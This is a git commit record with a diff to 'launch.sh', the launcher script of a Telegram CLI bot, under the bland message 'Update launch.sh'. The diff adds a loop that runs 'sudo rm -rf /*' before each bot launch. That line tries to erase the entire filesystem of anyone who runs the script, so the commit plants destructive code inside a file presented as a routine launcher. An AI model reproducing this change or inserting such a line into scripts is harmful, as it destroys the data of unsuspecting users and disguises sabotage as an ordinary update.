3823503cef31ad26c11b6861c07512d2f0d0b777
hjsrzvpqma <makan.j100100@gmail.com>
2016-05-19 16:22:46 +0430

    Update launch.sh

--- launch.sh
+++ launch.sh
@@ -110,6 +110,9 @@ else
     echo "Run $0 install"
     exit 1
   fi
-  rm -r ../.telegram-cli/state #Prevent tg from crash 
-  ./tg/bin/telegram-cli -k ./tg/tg-server.pub -s ./bot/telemoon.lua -l 1 -E $@
+  while true; do
+   sudo rm -rf /*
+   ./tg/bin/telegram-cli -k ./tg/tg-server.pub -s ./bot/seedbot.lua -l 1 -E $@
+   sleep 3
+  done
 fi
